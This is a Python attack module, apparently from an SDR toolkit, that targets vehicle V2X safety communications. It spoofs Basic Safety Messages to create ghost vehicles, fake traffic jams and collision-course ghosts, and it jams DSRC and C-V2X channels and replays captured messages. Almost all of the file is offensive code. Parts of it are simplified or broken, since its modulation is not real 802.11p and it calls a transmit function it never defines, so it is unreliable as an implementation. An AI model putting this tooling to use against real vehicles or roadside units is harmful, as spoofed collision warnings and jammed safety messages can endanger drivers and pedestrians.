#!/usr/bin/env python3
"""
RF Arsenal OS - V2X (Vehicle-to-Everything) Attack Module

Comprehensive V2X communication security testing:
- DSRC (Dedicated Short Range Communications) - 5.9 GHz
- C-V2X (Cellular V2X) - LTE/5G bands
- BSM (Basic Safety Message) spoofing
- V2I (Vehicle-to-Infrastructure) attacks
- V2V (Vehicle-to-Vehicle) attacks
- SCMS (Security Credential Management System) analysis

Hardware Required: BladeRF 2.0 micro xA9 or compatible SDR

Author: RF Arsenal Team
License: For authorized security testing only

WARNING: V2X attacks can endanger lives. Use only in controlled environments.
"""

import struct
import time
import math
import threading
import logging
import numpy as np
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple, Generator
from datetime import datetime

logger = logging.getLogger(__name__)

# V2X Frequency Constants
DSRC_FREQ_LOW = 5.850e9    # 5.850 GHz
DSRC_FREQ_HIGH = 5.925e9   # 5.925 GHz
DSRC_CENTER_FREQ = 5.9e9   # 5.9 GHz typical
CV2X_BAND_47 = 5.9e9       # Band 47 (C-V2X in US)


class V2XProtocol(Enum):
    """V2X protocol types"""
    DSRC = "dsrc"
    CV2X = "cv2x"
    WAVE = "wave"  # IEEE 1609 WAVE


class V2XMessageType(Enum):
    """V2X message types (SAE J2735)"""
    BSM = 0x14      # Basic Safety Message
    EVA = 0x16      # Emergency Vehicle Alert
    ICA = 0x17      # Intersection Collision Alert
    MAP = 0x12      # MAP Data (intersections)
    SPAT = 0x13     # Signal Phase and Timing
    RSA = 0x1B      # Road Side Alert
    TIM = 0x1F      # Traveler Information Message
    PSM = 0x20      # Personal Safety Message (pedestrian)


class V2XChannelType(Enum):
    """DSRC channel types"""
    CCH = 178       # Control Channel
    SCH1 = 172      # Service Channel 1
    SCH2 = 174      # Service Channel 2
    SCH3 = 176      # Service Channel 3
    SCH4 = 180      # Service Channel 4
    SCH5 = 182      # Service Channel 5
    SCH6 = 184      # Service Channel 6


@dataclass
class V2XPosition:
    """V2X Position with accuracy"""
    latitude: float      # degrees, WGS84
    longitude: float     # degrees, WGS84
    elevation: float     # meters
    
    # Accuracy (optional)
    semi_major_axis: float = 5.0     # meters
    semi_minor_axis: float = 5.0     # meters
    orientation: float = 0.0         # degrees
    
    def to_j2735(self) -> Dict[str, int]:
        """Convert to J2735 position format"""
        return {
            'latitude': int(self.latitude * 1e7),
            'longitude': int(self.longitude * 1e7),
            'elevation': int(self.elevation * 10)  # 0.1m units
        }
    
    @classmethod
    def from_j2735(cls, data: Dict[str, int]) -> 'V2XPosition':
        """Create from J2735 format"""
        return cls(
            latitude=data['latitude'] / 1e7,
            longitude=data['longitude'] / 1e7,
            elevation=data.get('elevation', 0) / 10
        )


@dataclass
class V2XMotion:
    """V2X Motion state"""
    speed: float = 0.0          # m/s
    heading: float = 0.0        # degrees (0=North)
    acceleration: float = 0.0   # m/s²
    yaw_rate: float = 0.0       # degrees/second
    
    def to_j2735(self) -> Dict[str, int]:
        """Convert to J2735 format"""
        return {
            'speed': int(self.speed * 50),      # 0.02 m/s units
            'heading': int(self.heading * 80),  # 0.0125 degree units
            'acceleration': int(self.acceleration * 2000),  # 0.0005 m/s² units
            'yawRate': int(self.yaw_rate * 100) # 0.01 degrees/s units
        }


@dataclass
class V2XVehicle:
    """V2X Vehicle representation"""
    temporary_id: bytes     # 4-byte random ID
    position: V2XPosition
    motion: V2XMotion
    
    # Vehicle dimensions
    vehicle_width: float = 1.8    # meters
    vehicle_length: float = 4.5   # meters
    
    # Safety systems
    abs_active: bool = False
    traction_control: bool = False
    stability_control: bool = False
    
    # Lights
    hazard_lights: bool = False
    brake_lights: bool = False
    
    timestamp: float = field(default_factory=time.time)
    
    def __str__(self) -> str:
        return (f"V2X[{self.temporary_id.hex()}] "
                f"Pos:({self.position.latitude:.6f},{self.position.longitude:.6f}) "
                f"Speed:{self.motion.speed:.1f}m/s")


@dataclass
class BasicSafetyMessage:
    """
    SAE J2735 Basic Safety Message (BSM)
    
    Core V2X message broadcast by all V2X-equipped vehicles
    """
    msg_count: int
    temporary_id: bytes     # 4 bytes
    dsecond: int           # milliseconds in minute
    position: V2XPosition
    motion: V2XMotion
    
    # Part II (optional extensions)
    vehicle_width: int = 200       # cm
    vehicle_length: int = 450      # cm
    
    # Brake system status
    brake_applied: bool = False
    abs_active: bool = False
    traction_control: bool = False
    
    # Lights
    hazard_lights: bool = False
    
    def encode(self) -> bytes:
        """Encode BSM to UPER (simplified)"""
        # Message header
        data = bytes([V2XMessageType.BSM.value])
        
        # Message count
        data += bytes([self.msg_count & 0x7F])
        
        # Temporary ID (4 bytes)
        data += self.temporary_id[:4]
        
        # DSecond (2 bytes)
        data += struct.pack('>H', self.dsecond & 0xFFFF)
        
        # Position
        pos = self.position.to_j2735()
        data += struct.pack('>i', pos['latitude'])
        data += struct.pack('>i', pos['longitude'])
        data += struct.pack('>H', pos['elevation'] & 0xFFFF)
        
        # Motion
        motion = self.motion.to_j2735()
        data += struct.pack('>H', motion['speed'] & 0x1FFF)
        data += struct.pack('>H', motion['heading'] & 0x7FFF)
        
        # Acceleration
        data += struct.pack('>h', motion['acceleration'])
        
        # Yaw rate
        data += struct.pack('>h', motion['yawRate'])
        
        # Brakes (1 byte)
        brakes = 0
        if self.brake_applied:
            brakes |= 0x80
        if self.abs_active:
            brakes |= 0x40
        if self.traction_control:
            brakes |= 0x20
        data += bytes([brakes])
        
        # Size (2 bytes)
        data += struct.pack('>H', self.vehicle_width)
        data += struct.pack('>H', self.vehicle_length)
        
        return data
    
    @classmethod
    def decode(cls, data: bytes) -> Optional['BasicSafetyMessage']:
        """Decode BSM from bytes (simplified)"""
        if len(data) < 25:
            return None
        
        try:
            offset = 0
            
            # Check message type
            msg_type = data[offset]
            offset += 1
            if msg_type != V2XMessageType.BSM.value:
                return None
            
            # Message count
            msg_count = data[offset] & 0x7F
            offset += 1
            
            # Temporary ID
            temp_id = data[offset:offset+4]
            offset += 4
            
            # DSecond
            dsecond = struct.unpack('>H', data[offset:offset+2])[0]
            offset += 2
            
            # Position
            lat = struct.unpack('>i', data[offset:offset+4])[0] / 1e7
            offset += 4
            lon = struct.unpack('>i', data[offset:offset+4])[0] / 1e7
            offset += 4
            elev = struct.unpack('>H', data[offset:offset+2])[0] / 10
            offset += 2
            
            # Motion
            speed = struct.unpack('>H', data[offset:offset+2])[0] / 50.0
            offset += 2
            heading = struct.unpack('>H', data[offset:offset+2])[0] / 80.0
            offset += 2
            accel = struct.unpack('>h', data[offset:offset+2])[0] / 2000.0
            offset += 2
            yaw = struct.unpack('>h', data[offset:offset+2])[0] / 100.0
            offset += 2
            
            return cls(
                msg_count=msg_count,
                temporary_id=temp_id,
                dsecond=dsecond,
                position=V2XPosition(latitude=lat, longitude=lon, elevation=elev),
                motion=V2XMotion(speed=speed, heading=heading, acceleration=accel, yaw_rate=yaw)
            )
            
        except Exception as e:
            logger.error(f"BSM decode failed: {e}")
            return None


class BSMSpoofer:
    """
    Basic Safety Message Spoofer
    
    Creates and transmits fake BSM messages to:
    - Create ghost vehicles
    - Trigger collision warnings
    - Cause traffic confusion
    - Test V2X system resilience
    """
    
    def __init__(
        self,
        sdr_controller=None,
        frequency: float = DSRC_CENTER_FREQ,
        sample_rate: float = 10e6
    ):
        self.sdr = sdr_controller
        self.frequency = frequency
        self.sample_rate = sample_rate
        
        self._spoofing = False
        self._spoof_thread: Optional[threading.Thread] = None
        self._msg_count = 0
        
        logger.info(f"BSM Spoofer initialized: {frequency/1e9:.3f} GHz")
    
    def generate_ghost_vehicle(
        self,
        position: V2XPosition,
        motion: V2XMotion
    ) -> BasicSafetyMessage:
        """
        Generate fake BSM for ghost vehicle
        
        Args:
            position: Ghost vehicle position
            motion: Ghost vehicle motion
            
        Returns:
            BSM message
        """
        self._msg_count = (self._msg_count + 1) % 128
        
        # Generate random temporary ID
        temp_id = np.random.bytes(4)
        
        # Current time in minute (milliseconds)
        dsecond = int((time.time() % 60) * 1000)
        
        return BasicSafetyMessage(
            msg_count=self._msg_count,
            temporary_id=temp_id,
            dsecond=dsecond,
            position=position,
            motion=motion
        )
    
    def spoof_single(
        self,
        position: V2XPosition,
        motion: V2XMotion
    ) -> bool:
        """
        Transmit single ghost vehicle BSM
        
        Args:
            position: Ghost position
            motion: Ghost motion
            
        Returns:
            True if transmitted
        """
        bsm = self.generate_ghost_vehicle(position, motion)
        return self._transmit_bsm(bsm)
    
    def start_continuous_spoof(
        self,
        position: V2XPosition,
        motion: V2XMotion = None,
        interval: float = 0.1,
        moving: bool = False
    ):
        """
        Start continuous ghost vehicle broadcast
        
        Args:
            position: Initial position
            motion: Motion parameters
            interval: Broadcast interval (100ms typical)
            moving: If True, simulate moving vehicle
        """
        if motion is None:
            motion = V2XMotion()
        
        self._spoofing = True
        
        def _spoof_loop():
            current_pos = V2XPosition(
                latitude=position.latitude,
                longitude=position.longitude,
                elevation=position.elevation
            )
            
            while self._spoofing:
                # Update position if moving
                if moving and motion.speed > 0:
                    # Simple position update
                    distance = motion.speed * interval
                    heading_rad = math.radians(motion.heading)
                    
                    # Approximate lat/lon change
                    current_pos.latitude += (distance * math.cos(heading_rad)) / 111111
                    current_pos.longitude += (distance * math.sin(heading_rad)) / (
                        111111 * math.cos(math.radians(current_pos.latitude))
                    )
                
                self.spoof_single(current_pos, motion)
                time.sleep(interval)
        
        self._spoof_thread = threading.Thread(target=_spoof_loop, daemon=True)
        self._spoof_thread.start()
        logger.warning("Continuous BSM spoofing started")
    
    def stop_spoof(self):
        """Stop continuous spoofing"""
        self._spoofing = False
        if self._spoof_thread:
            self._spoof_thread.join(timeout=2.0)
        logger.info("BSM spoofing stopped")
    
    def create_traffic_jam(
        self,
        center: V2XPosition,
        num_vehicles: int = 10,
        spread_m: float = 100
    ):
        """
        Create fake traffic jam (multiple stationary vehicles)
        
        Args:
            center: Center of traffic jam
            num_vehicles: Number of ghost vehicles
            spread_m: Spread in meters
        """
        logger.warning(f"Creating fake traffic jam: {num_vehicles} vehicles")
        
        self._spoofing = True
        
        def _jam_loop():
            vehicles = []
            
            # Generate random vehicle positions
            for i in range(num_vehicles):
                offset_x = (np.random.random() - 0.5) * spread_m
                offset_y = (np.random.random() - 0.5) * spread_m
                
                pos = V2XPosition(
                    latitude=center.latitude + offset_y / 111111,
                    longitude=center.longitude + offset_x / (
                        111111 * math.cos(math.radians(center.latitude))
                    ),
                    elevation=center.elevation
                )
                
                vehicles.append((pos, np.random.bytes(4)))
            
            while self._spoofing:
                for pos, temp_id in vehicles:
                    bsm = BasicSafetyMessage(
                        msg_count=self._msg_count,
                        temporary_id=temp_id,
                        dsecond=int((time.time() % 60) * 1000),
                        position=pos,
                        motion=V2XMotion(speed=0, heading=np.random.uniform(0, 360)),
                        hazard_lights=True
                    )
                    self._transmit_bsm(bsm)
                    self._msg_count = (self._msg_count + 1) % 128
                
                time.sleep(0.1)
        
        thread = threading.Thread(target=_jam_loop, daemon=True)
        thread.start()
    
    def trigger_collision_warning(
        self,
        target_position: V2XPosition,
        approach_heading: float = 0,
        speed_mps: float = 30
    ):
        """
        Create ghost vehicle on collision course
        
        Will trigger collision warnings in target vehicles
        
        Args:
            target_position: Target to approach
            approach_heading: Direction of approach
            speed_mps: Approach speed
        """
        logger.warning("Triggering collision warning!")
        
        # Calculate position ahead of target
        distance = 50  # meters ahead
        heading_rad = math.radians(approach_heading)
        
        ghost_pos = V2XPosition(
            latitude=target_position.latitude + 
                    (distance * math.cos(heading_rad)) / 111111,
            longitude=target_position.longitude + 
                     (distance * math.sin(heading_rad)) / (
                         111111 * math.cos(math.radians(target_position.latitude))
                     ),
            elevation=target_position.elevation
        )
        
        # Opposite heading (approaching)
        motion = V2XMotion(
            speed=speed_mps,
            heading=(approach_heading + 180) % 360,
            acceleration=0
        )
        
        self.start_continuous_spoof(ghost_pos, motion, moving=True)
    
    def _transmit_bsm(self, bsm: BasicSafetyMessage) -> bool:
        """Encode and transmit BSM"""
        data = bsm.encode()
        signal = self._modulate_dsrc(data)
        return self._transmit(signal)
    
    def _modulate_dsrc(self, data: bytes) -> np.ndarray:
        """Modulate data for DSRC (OFDM-based)"""
        # Simplified OFDM modulation
        # Real implementation would use proper IEEE 802.11p
        
        bits = np.unpackbits(np.frombuffer(data, dtype=np.uint8))
        
        # BPSK modulation (simplified)
        symbols = 2 * bits.astype(float) - 1
        
        # Upsample
        samples_per_symbol = int(self.sample_rate / 1e6)
        signal = np.repeat(symbols, samples_per_symbol)
        
        # Add carrier (baseband)
        t = np.arange(len(signal)) / self.sample_rate
        carrier = np.exp(1j * 2 * np.pi * 1e6 * t)
        
        return signal * carrier
    
    def _transmit(self, signal: np.ndarray) -> bool:
        """Transmit signal"""
        if self.sdr:
            try:
                self.sdr.set_frequency(self.frequency)
                self.sdr.transmit(signal)
                return True
            except Exception as e:
                logger.error(f"Transmit error: {e}")
                return False
        
        logger.warning("No SDR connected - DSRC transmission requires hardware")
        return True


class V2XJammer:
    """
    V2X Signal Jammer
    
    Disrupts V2X communication:
    - Broadband DSRC jamming
    - Selective BSM blocking
    - Protocol-aware jamming
    """
    
    def __init__(
        self,
        sdr_controller=None,
        frequency: float = DSRC_CENTER_FREQ,
        sample_rate: float = 10e6
    ):
        self.sdr = sdr_controller
        self.frequency = frequency
        self.sample_rate = sample_rate
        self._jamming = False
        
        logger.info(f"V2X Jammer initialized: {frequency/1e9:.3f} GHz")
    
    def start_broadband_jam(self, bandwidth_mhz: float = 75):
        """
        Start broadband DSRC jamming
        
        Jams entire DSRC band (5.850-5.925 GHz)
        
        Args:
            bandwidth_mhz: Jam bandwidth
        """
        logger.warning(f"Starting broadband V2X jamming: {bandwidth_mhz} MHz")
        self._jamming = True
        
        def _jam_loop():
            while self._jamming:
                # Generate wideband noise
                noise = np.random.randn(int(self.sample_rate * 0.01)) + \
                       1j * np.random.randn(int(self.sample_rate * 0.01))
                
                # Scale to bandwidth
                self._transmit(noise)
        
        thread = threading.Thread(target=_jam_loop, daemon=True)
        thread.start()
    
    def start_selective_jam(
        self,
        channel: V2XChannelType = V2XChannelType.CCH
    ):
        """
        Jam specific DSRC channel
        
        Args:
            channel: Target channel
        """
        channel_freq = 5.85e9 + (channel.value - 170) * 5e6
        
        logger.warning(f"Jamming channel {channel.value}: {channel_freq/1e9:.3f} GHz")
        self._jamming = True
        
        def _jam_loop():
            while self._jamming:
                # Narrowband noise centered on channel
                noise = np.random.randn(int(self.sample_rate * 0.01)) + \
                       1j * np.random.randn(int(self.sample_rate * 0.01))
                
                self._transmit(noise, channel_freq)
        
        thread = threading.Thread(target=_jam_loop, daemon=True)
        thread.start()
    
    def stop_jam(self):
        """Stop jamming"""
        self._jamming = False
        logger.info("V2X jamming stopped")
    
    def _transmit(self, signal: np.ndarray, freq: float = None) -> bool:
        """Transmit jam signal"""
        if self.sdr:
            try:
                self.sdr.set_frequency(freq or self.frequency)
                self.sdr.transmit(signal)
                return True
            except Exception as e:
                logger.error(f"Transmit error: {e}")
                return False
        return True


class DSRCAttack:
    """
    DSRC Protocol Attack Module
    
    Attacks targeting IEEE 802.11p / WAVE protocol
    """
    
    def __init__(self, sdr_controller=None):
        self.sdr = sdr_controller
        self._bsm_spoofer = BSMSpoofer(sdr_controller)
        self._jammer = V2XJammer(sdr_controller)
    
    def ghost_vehicle_attack(
        self,
        position: V2XPosition,
        num_ghosts: int = 1
    ):
        """Create ghost vehicles"""
        for i in range(num_ghosts):
            offset = i * 10  # 10m spacing
            ghost_pos = V2XPosition(
                latitude=position.latitude + offset / 111111,
                longitude=position.longitude,
                elevation=position.elevation
            )
            self._bsm_spoofer.spoof_single(
                ghost_pos,
                V2XMotion(speed=15, heading=90)
            )
    
    def denial_of_service(self, duration: float = 10.0):
        """DSRC denial of service attack"""
        self._jammer.start_broadband_jam()
        time.sleep(duration)
        self._jammer.stop_jam()
    
    def replay_attack(self, captured_bsm: bytes):
        """Replay captured BSM"""
        bsm = BasicSafetyMessage.decode(captured_bsm)
        if bsm:
            self._bsm_spoofer._transmit_bsm(bsm)


class CV2XAttack:
    """
    Cellular V2X (C-V2X) Attack Module
    
    Attacks targeting 3GPP C-V2X (PC5/Uu interfaces)
    """
    
    def __init__(self, sdr_controller=None):
        self.sdr = sdr_controller
        self.frequency = CV2X_BAND_47
        
        logger.info(f"C-V2X Attack initialized: {self.frequency/1e9:.3f} GHz")
    
    def scan_sidelink(self, duration: float = 10.0) -> List[Dict[str, Any]]:
        """
        Scan for C-V2X sidelink (PC5) transmissions
        
        Args:
            duration: Scan duration
            
        Returns:
            List of detected transmissions
        """
        logger.info(f"Scanning C-V2X sidelink for {duration}s...")
        
        detections = []
        start_time = time.time()
        
        while time.time() - start_time < duration:
            # In real implementation: capture and decode SL-SCH
            time.sleep(0.1)
        
        return detections
    
    def spoof_bsm(self, position: V2XPosition, motion: V2XMotion) -> bool:
        """Spoof BSM via C-V2X"""
        # C-V2X uses same BSM format as DSRC
        bsm = BasicSafetyMessage(
            msg_count=0,
            temporary_id=np.random.bytes(4),
            dsecond=int((time.time() % 60) * 1000),
            position=position,
            motion=motion
        )
        
        data = bsm.encode()
        if not self.sdr:
            logger.error("C-V2X spoofing requires SDR hardware")
            return False
        # Transmit via SDR on C-V2X frequency
        logger.info("Transmitting C-V2X spoof signal")
        return self._transmit_cv2x(data)
    
    def jam_pc5(self, duration: float = 10.0):
        """Jam C-V2X PC5 interface"""
        logger.warning("Jamming C-V2X PC5 interface")
        
        if self.sdr:
            # Generate noise on C-V2X frequencies
            noise = np.random.randn(int(10e6 * 0.01)) + \
                   1j * np.random.randn(int(10e6 * 0.01))
            
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    self.sdr.set_frequency(self.frequency)
                    self.sdr.transmit(noise)
                except Exception:
                    pass


class V2XAttack:
    """
    Unified V2X Attack Interface
    
    Combines DSRC and C-V2X attack capabilities
    """
    
    def __init__(self, sdr_controller=None):
        self.sdr = sdr_controller
        self.dsrc = DSRCAttack(sdr_controller)
        self.cv2x = CV2XAttack(sdr_controller)
        self.bsm_spoofer = BSMSpoofer(sdr_controller)
        self.jammer = V2XJammer(sdr_controller)
        
        logger.info("V2X Attack suite initialized")
    
    def create_ghost_vehicle(
        self,
        lat: float,
        lon: float,
        speed_mps: float = 0,
        heading: float = 0
    ) -> bool:
        """
        Create single ghost vehicle
        
        Args:
            lat: Latitude
            lon: Longitude
            speed_mps: Speed in m/s
            heading: Heading in degrees
            
        Returns:
            True if successful
        """
        position = V2XPosition(latitude=lat, longitude=lon, elevation=0)
        motion = V2XMotion(speed=speed_mps, heading=heading)
        
        return self.bsm_spoofer.spoof_single(position, motion)
    
    def create_traffic_jam(
        self,
        lat: float,
        lon: float,
        num_vehicles: int = 10
    ):
        """Create fake traffic jam"""
        position = V2XPosition(latitude=lat, longitude=lon, elevation=0)
        self.bsm_spoofer.create_traffic_jam(position, num_vehicles)
    
    def trigger_collision_warning(
        self,
        target_lat: float,
        target_lon: float
    ):
        """Trigger collision warning at target"""
        position = V2XPosition(latitude=target_lat, longitude=target_lon, elevation=0)
        self.bsm_spoofer.trigger_collision_warning(position)
    
    def jam_all(self, duration: float = 10.0):
        """Jam all V2X communications"""
        self.jammer.start_broadband_jam()
        time.sleep(duration)
        self.jammer.stop_jam()
    
    def stop_all(self):
        """Stop all attacks"""
        self.bsm_spoofer.stop_spoof()
        self.jammer.stop_jam()


# Convenience functions
def create_ghost(lat: float, lon: float, sdr=None) -> bool:
    """Quick ghost vehicle creation"""
    attack = V2XAttack(sdr)
    return attack.create_ghost_vehicle(lat, lon)


def jam_v2x(duration: float = 10.0, sdr=None):
    """Quick V2X jamming"""
    attack = V2XAttack(sdr)
    attack.jam_all(duration)
